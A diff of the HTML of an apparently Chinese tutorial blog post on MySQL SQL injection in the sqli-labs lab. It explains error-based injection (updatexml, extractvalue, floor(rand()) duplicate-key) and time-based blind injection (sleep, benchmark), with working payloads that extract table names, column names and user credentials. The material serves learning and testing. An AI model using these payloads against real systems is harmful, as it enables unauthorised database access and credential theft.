 <figure><img src="/ox-hugo/2022-03-23_20-38-37_screenshot.png" width="400px"/>
     </figure>
 
 <p>查询当前数据库名称及操作系统版本信息：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,database(),0x7e,@@version_compile_os,0x7e),3)-- -
-</span></span></span></code></pre></div><p>获取当前数据库下数据表信息：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3)-- -
-</span></span></span></code></pre></div><p>为啥不可以？</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),3)-- -
-</span></span></span></code></pre></div><p>注意
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,database(),0x7e,@@version_compile_os,0x7e),3)-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取当前数据库下数据表信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),3)-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>为啥不可以？</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),3)-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意
 : updatexml最多只能显示32位，需要配合SUBSTR使用</p>
 </li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
 <li>
-<p>(2) <code>extractvalue()</code></p>
-<p>函数语法:extractvalue(XML_document,XPath_string)</p>
-<p>适用的版本：5.1.5+</p>
-<p>利用的原理也是xpath格式不符报错注入</p>
+<p><code>extractvalue()</code></p>
+<p>extractvalue(XML_document,XPath_string)
+: -   XML_document:是字符串String格式，为XML文档对象名称
+-   Xpath_string:Xpath格式的字符串，例如：boostore, bookstore/book, <em>/book, bookstore//book, //@lang, /[/@\d]</em>
+-   作用是从目标XML中返回包含所查询值的字符串</p>
+<pre><code> -   适用的版本：5.1.5+
+</code></pre>
+<p>利用的原理也是xpath格式不符报错注入：</p>
 <p>获取当前是数据库名称及使用mysql数据库的版本信息：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">version</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
-</span></span></span></code></pre></div><p>获取当前注入点的用户权限信息及操作系统版本信息：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="o">@@</span><span class="n">version_compile_os</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
-</span></span></span></code></pre></div><p>获取当前位置所用数据库的位置：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="o">@@</span><span class="n">datadir</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
-</span></span></span></code></pre></div><p>获取数据表信息:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
-</span></span></span></code></pre></div><p>获取users数据表的列名信息:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
-</span></span></span></code></pre></div><p>获取对应的列名的信息(username\password):</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
-</span></span></span></code></pre></div></li>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">database</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">version</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取当前注入点的用户权限信息及操作系统版本信息：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="o">@@</span><span class="n">version_compile_os</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="k">user</span><span class="p">(),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取当前位置所用数据库的位置：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,</span><span class="o">@@</span><span class="n">datadir</span><span class="p">,</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取数据表信息:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">table_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">table_schema</span><span class="o">=</span><span class="k">database</span><span class="p">()</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取users数据表的列名信息:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="k">column_name</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">table_name</span><span class="o">=</span><span class="s1">&#39;users&#39;</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>获取对应的列名的信息(username\password):</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">and</span><span class="w"> </span><span class="n">extractvalue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">concat</span><span class="p">(</span><span class="mi">0</span><span class="n">x7e</span><span class="p">,(</span><span class="k">select</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">limit</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span><span class="mi">0</span><span class="n">x7e</span><span class="p">))</span><span class="c1">-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div></li>
 </ul>
-<h4 id="主键重复">- 主键重复</h4>
+<h4 id="主键重复">主键重复</h4>
 <p><a class="link" href="https://www.freebuf.com/articles/web/242986.html"  target="_blank" rel="noopener"
-    >https://www.freebuf.com/articles/web/242986.html</a>
-主键重复无论是理解和解释都比较复杂，我们先给出常用的payload，然后慢慢细说</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">));</span><span class="w">
+    >MySQL floor()报错原理分析</a></p>
+<p>主键重复无论是理解和解释都比较复杂，我们先给出常用的payload，然后慢慢细说</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">concat</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">));</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span><span class="n">concat</span><span class="p">(</span><span class="k">database</span><span class="p">(),</span><span class="n">floor</span><span class="p">(</span><span class="n">rand</span><span class="p">(</span><span class="mi">14</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">))</span><span class="n">x</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">group</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="n">x</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><p>我们使用sali-labs的环境，因此这里的database()的值就是security
-以上payload的报错就是：</p>
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>我们使用sali-labs的环境，因此这里的database()的值就是security</p>
+<p>那么以上payload的报错就是：</p>
 <figure><img src="/ox-hugo/2022-03-31_21-08-10_screenshot.png" width="600px"/>
 </figure>
 
-<p>我们观察到这里提示有&rsquo;security0&rsquo;主键重复,这里思考几个问题，1）security后面的0是哪里来的？2）主键是哪里来的？3）为什么会发生主键重复？4）为什么rand的seed是14（一般看到的可能就是0）</p>
+<p>我们观察到这里提示有&rsquo;security0&rsquo;主键重复,这里思考几个问题：</p>
+<ol>
+<li>security后面的0是哪里来的？</li>
+<li>主键是哪里来的？</li>
+<li>为什么会发生主键重复？</li>
+<li>为什么rand的seed是14（一般看到的可能就是0）</li>
+</ol>
 <!-- raw HTML omitted -->
 <ul>
 <li>
-<p>(1) security后面的0是哪里来的？</p>
+<p>security后面的0是哪里来的？</p>
 <p>通过 <code>floor(rand(14)*2)</code> 构造出来的</p>
-<p>rand([seed]),通过给定不同的seed来返回(0,1)的值，而floor()函数则会将float的值向下取整，那么rand(14)*2∈(0,2)，向下取整就变成了{0,1}</p>
+<p>rand([seed]),通过给定不同的seed来返回(0,1)范围中的值，而floor()函数则会将float的值向下取整，因此rand(14)*2∈(0,2)，向下取整就变成了{0,1}，结果就是0或者1</p>
 </li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
 <li>
-<p>(2) 主键是哪里来的？</p>
-<p>我们这里使用了group by语句，目的是对查询的结果根据给出的字段进行分类，这里我们使用聚合函数count(*)，可以用来统计每个主键出现的次数</p>
-<p>在实际实现的过程中，数据库会首先创建一个空的临时表，包含两个字段
-key = concat(database(),floor(rand(14)*2))
-count(*) = 主键出现的次数</p>
+<p>主键是哪里来的？</p>
+<p>我们这里使用了group by语法，目的是对查询的结果根据给出的字段进行分类，而查询到的结果会放在一个临时表中，我们给出的字段就是这个临时表的主键；</p>
+<p>这里我们使用聚合函数count(*)，用来统计每个主键出现的次数；</p>
+<p>在实际实现的过程中，数据库会首先创建一个空的临时表，包含两个字段：</p>
+<ul>
+<li>key = concat(database(),floor(rand(14)*2)), 主键，不能重复；</li>
+<li>count(*) = 主键在原来的users表中出现的次数；</li>
+</ul>
 <div class="table-wrapper"><table>
 <thead>
 <tr>
@@ -447,14 +704,17 @@ count(*) = 主键出现的次数</p>
 <!-- raw HTML omitted -->
 <ul>
 <li>
-<p>(3) 为什么会发生主键重复？</p>
+<p>为什么会发生主键重复？</p>
 <p>我们接着看，接下来数据库会根据主键逐条查询users表中的内容。</p>
 <figure><img src="/ox-hugo/2022-03-31_21-23-38_screenshot.png" width="200px"/>
     </figure>
 
-<p>这里为了得到主键的具体内容，进行了第一次计算，得到security1(之前不是说了随机，这里我为什么说就是security1呢，因为实际测试结果就是，第一个生成的数字一定就是1，我认为可能和伪随机机制有关系)
-我们当然之后users表里不会有security1这样的字段，同样数据库也找不到，同时也没有发现重复的主键，因此会把主键的值直接插入临时表中，并将count(*)增加为1</p>
-<p>此时为了得到需要插入的主键的值，会再进行一次计算，得到的结果为security0（必然发生，理由同上）</p>
+<p>这里为了得到主键 <code>key</code> 的具体内容方便接下来的查询，进行第一次floor(rand())计算：</p>
+<p>得到 <code>security1</code> (之前不是说了随机，这里我为什么说就是security1呢，因为实际测试结果就是，第一个生成的数字一定就是1，我认为可能和伪随机机制有关系)</p>
+<p>我们当然知道之后users表里不会有security1这样的字段，同样数据库也找不到</p>
+<p>此时没有发现重复的主键，因此会把主键的值直接插入临时表中，并将count(*)的值增加为1</p>
+<p>此时为了得到需要插入的主键的值，会进行第二次 flood(rand())计算:</p>
+<p>得到的结果为security0（必然发生，理由同上）</p>
 <div class="table-wrapper"><table>
 <thead>
 <tr>
@@ -481,17 +741,25 @@ count(*) = 主键出现的次数</p>
 </tr>
 </tbody>
 </table></div>
-<p>继续检索第二条数据，计算主键的值，为security1（必然发生，理由同上），同样在users表中也没有找到主键的字段，同时也没有发现临时表中有重复的主键。</p>
+<p>继续遍历users表中的第二条数据，计算主键的值，为security1（必然发生，理由同上），同样在users表中也没有找到主键的字段，也没有发现临时表中有重复的主键。</p>
 <p>接着插入主键的值，再次计算，得到security0（必然发生，理由同上）,但是这个时候在插入的时候，就会发生主键冲突而产生报错，因为原本的临时表中已经有一个security0了，同时会把数据库的名字+0拼接在报错信息上</p>
-<p>那么同样的，如果我们选择查询其他的信息来取得这里的database()，那么在报错的时候，就能看到所查询的信息</p>
+<p>那么同样的，如果我们选择查询其他的信息来代替这里的database()，那么在报错的时候，就能拼接得到我们想要查询的信息</p>
 </li>
 </ul>
 <!-- raw HTML omitted -->
 <ul>
 <li>
-<p>（4）为什么将rand的seed设为14？</p>
-<p>大家可能平时看到的都是设为0的，那么先给大家看一下两种seed带来不同的效果</p>
-<!-- raw HTML omitted -->
+<p>为什么将rand的seed设为14？</p>
+<p>大家可能平时看到的都是设为0的，那么这里就给大家看一下两种seed带来不同的效果</p>
+<figure><img src="/ox-hugo/2022-03-31_21-39-31_screenshot.png"
+             alt="Figure 3: rand()使用不同seed的结果" width="300px"/><figcaption>
+                <p><!-- raw HTML omitted -->Figure 3: <!-- raw HTML omitted -->rand()使用不同seed的结果</p>
+            </figcaption>
+    </figure>
+
+<p>大家有看出什么不同的地方吗？</p>
+<p>我们使用users表中的来多次计算flood(rand())的值，来模拟主键重复中多次计算的场景：</p>
+<p>我们发现，在seed为0的时候，伪随机给出的计算结果其顺序为：</p>
 <div class="table-wrapper"><table>
 <thead>
 <tr>
@@ -533,8 +801,8 @@ count(*) = 主键出现的次数</p>
 </tr>
 </tbody>
 </table></div>
-<p>这里需要至少三条记录才能造成主键重复</p>
-<p>那我们再来看seed为14的时候，伪随机给出的顺序为</p>
+<p>这里需要至少 <code>三条记录</code> 才能造成主键重复</p>
+<p>那我们再来看seed为14的时候，伪随机给出的顺序为：</p>
 <div class="table-wrapper"><table>
 <thead>
 <tr>
@@ -566,23 +834,70 @@ count(*) = 主键出现的次数</p>
 </tr>
 </tbody>
 </table></div>
-<p>很明显，只要有两条记录，即可造成报错</p>
+<p>很明显，只要有两条记录，即可造成报错，因此使用14作为rand()的seed是非常合适的.</p>
 <p>大家可以根据我的sql语句进行尝试，得到的结果顺序应该是一致，这也就回答了为什么我之前提到的明明是随机到的结果，为什么说是必然的到的。</p>
 </li>
 </ul>
-<h3 id="3-dot-时间盲注">3. 时间盲注</h3>
-<p>时间盲注是一种边信道攻击(Side-channel attack SCA)，原本是密码学的一个概念，这种攻击用于加密算法的破解，它基于密码系统的物理实现而不是加密算法其本身，比如加密所需要的时间，所消耗的电子设备的一切资源，甚至电磁泄露或者声音这些信息来反过来分析算法本身。个人认为SCA的一个特点，就是要刻意扩大一个正常的操作的影响，以此制造明显的特征。</p>
-<p>那么在时间盲注中，我们无法像不同注入那样，得到查询的数据，也无法通过布尔盲注或者报错盲注在页面上显示的获得任何信息，而是通过通过判断语句，同时增加成功注入所使用的时间，通过不同拼接语句所需要的时间来判断是否成功执行。</p>
-<h4 id="sleep">- <code>sleep()</code></h4>
+<h3 id="时间盲注">时间盲注</h3>
+<p>时间盲注是一种边信道攻击(Side-channel attack SCA)，这原本是密码学的一个概念，这种攻击用于加密算法的破解，它基于密码系统的物理实现而不是加密算法其本身，比如加密所需要的时间，所消耗的电子设备的一切资源，甚至电磁泄露或者声音这些信息来反过来分析算法本身。</p>
+<p>个人认为SCA的一个特点，就是要刻意放大一个正常的操作的影响，以此制造明显的特征。</p>
+<p>那么在时间盲注中，我们无法像普通注入那样，得到查询的数据，也无法通过布尔盲注或者报错盲注在页面上显示的获得任何信息，而是通过通过判断语句，同时增加成功注入所使用的时间，最后通过判断响应时间的变化来判断是否成功执行。</p>
+<h4 id="sleep"><code>sleep()</code></h4>
+<dl>
+<dt>IF(condition, true_value, false_value)</dt>
+<dd><ul>
+<li>如果condition结果为true则返回true_value,反之则返回false_value</li>
+</ul>
+</dd>
+<dt>FIND_IN_SET(str, str_list)</dt>
+<dd><ul>
+<li>如果str在str_list中，则返回0；</li>
+<li>如果str或者str_list其中有一个为NULL，则返回NULL;</li>
+<li>如果str_list为空（&quot;&quot;），也返回0;</li>
+<li>否则返回0</li>
+</ul>
+</dd>
+<dt>sleep(duration)</dt>
+<dd><ul>
+<li>执行该函数回休眠duration秒的时间；</li>
+<li>函数的返回值为0</li>
+<li>如果实参输入为NULL或者负数，则会出现警告，或者在strict SQL模式下报错</li>
+</ul>
+</dd>
+</dl>
 <p>利用if进行判断，如果满足条件，则延迟响应5s</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; or if(ascii(substr(database(),1,1))&gt;115,sleep(5), 0)-- - //if 判断语句，条件为真， 执行 sleep
-</span></span></span><span class="line"><span class="cl"><span class="s1">select sleep(find_in_set(mmid(@@version, 1, 1), &#39;</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,.</span><span class="s1">&#39;));
-</span></span></span></code></pre></div><p>注意这里建议使用 <code>or</code> 比较保险</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; or if(ascii(substr(database(),1,1))&gt;115, sleep(5), 0)-- - //if 判断语句，条件为真， 执行 sleep
+</span></span></span><span class="line"><span class="cl"><span class="s1">select sleep(find_in_set(mid(@@version, 1, 1), &#39;</span><span class="mi">0</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="mi">9</span><span class="p">,.</span><span class="s1">&#39;));
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意这里建议使用 <code>or</code> 比较保险</p>
 <p>如果在测试的时候使用，?id=-1&rsquo; and if&hellip;,由于id=-1本身为False，后面的语句都不会执行（为什么不用1？为了统一习惯吧）</p>
-<h4 id="benchmark">- <code>Benchmark()</code></h4>
-<p>利用benchmark函数，对一个操作进行多次的操作来实现延时</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),benchmark(5000000000000000, sha(1),0)-- -
-</span></span></span></code></pre></div><div class="table-wrapper"><table>
+<h4 id="benchmark"><code>Benchmark()</code></h4>
+<p>利用benchmark函数，对一个操作进行多次的操作来实现延时：</p>
+<dl>
+<dt>BENCHMARK(count ,expr)</dt>
+<dd><ul>
+<li>执行count次expr操作</li>
+<li>返回值永远都是0</li>
+</ul>
+</dd>
+</dl>
+<!-- raw HTML omitted -->
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">1</span><span class="s1">&#39; and if((ascii(substr((select username from users limit 0,1), 1, 1))=68),benchmark(5000000000000000, sha(1),0)-- -
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
 <thead>
 <tr>
 <th>Database</th>
@@ -604,35 +919,111 @@ count(*) = 主键出现的次数</p>
 </tr>
 </tbody>
 </table></div>
-<h4 id="笛卡尔积-heavy-query">- 笛卡尔积（heavy query）</h4>
-<p>通过查询多个表合集来造成大量的查询，导致查询时间变长造成延迟</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="n">A</span><span class="p">,</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="n">B</span><span class="p">,</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="w"> </span><span class="k">C</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="o">/</span><span class="n">sqli</span><span class="o">/</span><span class="k">Less</span><span class="o">-</span><span class="mi">5</span><span class="o">/</span><span class="w">
+<h4 id="笛卡尔积-heavy-query">笛卡尔积（heavy query）</h4>
